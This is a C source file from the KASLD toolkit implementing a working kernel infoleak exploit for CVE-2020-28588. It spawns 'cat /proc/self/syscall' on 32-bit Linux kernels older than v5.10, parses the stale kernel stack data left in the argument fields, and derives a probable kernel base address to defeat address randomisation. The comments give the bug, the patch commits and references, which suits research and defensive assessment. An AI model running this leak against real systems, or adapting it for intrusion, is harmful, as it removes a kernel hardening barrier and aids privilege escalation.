// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve process syscall argument registers from /proc/<PID>/syscall
// which may leak uninitialized kernel stack memory from collect_syscall()
// on 32-bit systems (ARM/x86_32/...) (CVE-2020-28588).
// Discovered by Lilith >_> and Claudio Bozzato of Cisco Talos.
//
// Introduced in kernel v5.1-rc4 on 2019-04-04:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
//
// Patched in kernel v5.10-rc7~25 on 2020-12-03.
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
//
// Leak primitive:
//   Data leaked:      kernel stack data (args[3..5], never written on 32-bit)
//   Kernel subsystem: fs/proc — /proc/<PID>/syscall (collect_syscall)
//   Data structure:   struct syscall_info → data.args[]
//   Address type:     virtual (kernel stack)
//   Method:           parsed
//   CVE:              CVE-2020-28588
//   Patched:          v5.10 (commit 4f134b89a24b)
//   Status:           fixed in v5.10
//   Access check:     none pre-v5.10 (world-readable /proc/<PID>/syscall)
//   Source: https://elixir.bootlin.com/linux/v5.9/source/fs/proc/base.c
//
// Mitigations:
//   Patched in v5.10. No runtime sysctl could restrict access — the bug is
//   that collect_syscall() stores six `unsigned long` into a __u64 args[6],
//   covering 24 of 48 bytes on 32-bit. Only affects 32-bit kernels (ARM,
//   x86_32, etc.).
//
// Requires:
// - CONFIG_HAVE_ARCH_TRACEHOOK=y
//
// References:
// https://talosintelligence.com/vulnerability_reports/TALOS-2020-1211
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
// https://cateee.net/lkddb/web-lkddb/HAVE_ARCH_TRACEHOOK.html
//
// 32-bit-kernel only — gated at compile time. collect_syscall() fills
// data.args[] by storing six `unsigned long`, but the array is __u64 args[6]:
// on 32-bit that writes 24 of 48 bytes, so args[3..5] are never written at
// all, while args[0..2] each carry two real arguments packed into one field.
// 64-bit kernels run the SAME code with sizeof(long) == 8, where six stores
// fill the array exactly and no residue remains — the values exposed there
// are ordinary syscall numbers and pointers, and misinterpreting one as a
// kernel address would produce a nonsense observation.
// ---
// <bcoles@gmail.com>

#if __SIZEOF_LONG__ != 4
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/kasld/kernel_floor.h"
#include <errno.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Reads /proc/<PID>/syscall on a 32-bit kernel. The file reports six "
    "64-bit argument fields, but the kernel fills them with six 32-bit "
    "words. Before the v5.10 fix (CVE-2020-28588), the last three fields "
    "were left holding stale kernel stack data — a text pointer on x86_32, "
    "arm and riscv32, a direct-map pointer on powerpc and mips.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "addr:virtual\n"
           "cve:CVE-2020-28588\n"
           "patch:v5.10\n"
           "config:CONFIG_HAVE_ARCH_TRACEHOOK\n");

static unsigned long get_kernel_addr_proc_pid_syscall(void) {
  FILE *f;
  int iterations = 10;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;
  const char *cmd = "/bin/cat /proc/self/syscall";
  char buff[1024];
  char *ptr;
  char *endptr;

  kasld_info("checking /proc/self/syscall argument registers ...");

  int i;
  for (i = 0; i < iterations; i++) {
    /* cat is the leaker, not this process. The CVE leaks stale upper
     * bytes of 64-bit arg fields from the reading process's kernel
     * stack at collect_syscall() time; cat's stack at read(2) is
     * shallower and empirically yields lower (closer to _stext)
     * addresses than an in-process fopen, whose stack carries libc
     * startup + the KASLD emitter call chain. */
    f = popen(cmd, "r");
    if (f == NULL) {
      perror("[-] popen");
      return 0;
    }

    if (fgets(buff, sizeof(buff), f) == NULL) {
      perror("[-] fgets");
      pclose(f);
      return 0;
    }

    pclose(f);

    /* Lazy implementation. In practice we only want data after the first 24
     * bytes (from the fifth value onwards).
     *
     * $ cat /proc/self/syscall
     * 0 0x76f7300000000003 0x4000 0x0 0x8050389c8098fde4 0xee297df0ee297e2c ...
     *                                   ^       ^
     */
    ptr = strtok(buff, " ");
    while ((ptr = strtok(NULL, " ")) != NULL) {
      int reg_addr_len = strlen(ptr);

      // Registers are printed without leading zeros (0x00001234 -> "0x1234"),
      // possibly concatenated (0x0000abcd and 0x12345678 -> "0xabcd12345678").
      //
      // Accept lengths 10 (single 8-hex-digit register with "0x" prefix) or
      // 11–18 (two concatenated registers). Kernel pointers mapped below
      // 0x10000000 (e.g. phys 0x00008000) are missed by this length check.
      if (reg_addr_len < 10 || reg_addr_len > 18)
        continue;

      unsigned long long reg_addr = strtoull(&ptr[0], &endptr, 16);

      if (!reg_addr)
        continue;

      if (reg_addr_len == 10) {
        // register argument is a single pointer.
        leaked_addr = reg_addr;
      } else if (reg_addr_len > 10 && reg_addr_len <= 18) {
        // register argument is two concatenated pointers.
        // split it and choose the lowest of the two.
        unsigned long a = reg_addr >> 32;
        unsigned long b = reg_addr & 0xffffffff;

        /* Sort the two halves by the user/kernel boundary, not by
         * KERNEL_VIRT_TEXT_MIN: on 32-bit with a 3G/1G split that floor
         * (0x40000000) overlaps user space and would misread register values
         * (SP, LR, mmap addresses) as kernel pointers. Kernel stack addresses
         * leaked by CVE-2020-28588 are always at or above the boundary.
         *
         * MEASURED rather than the compile-time PAGE_OFFSET, which names this
         * build's split and not the target's. On a kernel whose split sits
         * lower, every genuine pointer in between falls under that constant and
         * is dropped — silently, and indistinguishably from finding nothing.
         * The measured value is also far tighter than the sound static
         * alternative: PAGE_OFFSET_MIN is the same 0x40000000 this comment
         * rejects. */
        unsigned long floor = kasld_kernel_pointer_floor();
        if (a < floor && b < floor)
          continue;

        if (a >= floor && b >= floor) {
          if (a < b) {
            leaked_addr = a;
          } else {
            leaked_addr = b;
          }
        } else if (a >= floor) {
          leaked_addr = a;
        } else if (b >= floor) {
          leaked_addr = b;
        }
      } else {
        continue;
      }

      if (!leaked_addr)
        continue;

      /* Region floor for a REGION_KERNEL_TEXT emission: a text address sits at
       * or above PAGE_OFFSET (the linear-map base), one module band above the
       * user/kernel boundary filter 1 sorted by. kasld_page_offset_floor() is
       * the MEASURED base snapped to the target's VMSPLIT, so a lower-split
       * kernel's real _text (0x80008000 on a 2G build) is admitted where the
       * compile-time PAGE_OFFSET would silently drop it. The max() with
       * KERNEL_VIRT_TEXT_MIN is defence-in-depth against a zero floor. */
      unsigned long po = kasld_page_offset_floor();
      unsigned long lo = po > (unsigned long)KERNEL_VIRT_TEXT_MIN
                             ? po
                             : (unsigned long)KERNEL_VIRT_TEXT_MIN;
      if (leaked_addr >= lo && leaked_addr <= KERNEL_VIRT_TEXT_MAX) {
        if (!addr || leaked_addr < addr)
          addr = leaked_addr;
      }
    }
  }

  return addr;
}

int main(void) {
  if (kasld_skip_live_probe("/proc/self/syscall"))
    return 0;
  /* Live probe: spawns `cat /proc/self/syscall` and parses the reading
   * process's leaked kernel-stack residue — dynamic per-process state. */
  unsigned long addr = get_kernel_addr_proc_pid_syscall();
  if (!addr) {
    kasld_err("no kernel address found in /proc/pid/syscall");
    return 0;
  }

  kasld_info("lowest leaked address: %lx", addr);
  kasld_info("possible kernel base: %lx", kasld_floor_text_base(addr));
  /* The leaked word is a kernel address; nothing available here establishes
   * that it is TEXT. It is whatever the reading task's call chain left on
   * proc_pid_syscall()'s own stack frame, which differs by architecture: a
   * return address into text on x86_32, arm and riscv32; a direct-map pointer
   * (kernel stacks, lowmem objects) on powerpc and mips, where the image is
   * randomized above them and a direct-map word therefore lands BELOW _text.
   *
   * An interior-text sample implies image_base <= sample, so tagging a
   * direct-map word as text truncates the image-base window below the true
   * base. CONF_HEURISTIC keeps the observation under the sound floor, where
   * the engine's confidence gate drops it from the floored run entirely: it
   * shapes the likely window, and cannot bound the guaranteed one. Confirming
   * text membership needs a text band this component cannot see — it runs
   * before inference, and that band is the unknown being solved for. */
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, NULL,
                      CONF_HEURISTIC);

  return 0;
}
